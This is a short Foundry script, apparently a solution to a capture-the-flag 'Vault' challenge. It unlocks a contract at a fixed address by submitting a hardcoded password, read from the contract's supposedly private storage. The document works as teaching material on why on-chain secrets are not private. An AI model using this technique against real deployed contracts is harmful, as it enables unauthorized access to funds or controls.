// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/Vault.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract VaultSolution is Script {

    Vault public vaultInstance = Vault(0xa0fF6C04CFb4509064EF1b99F814c21645Eb552a);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}
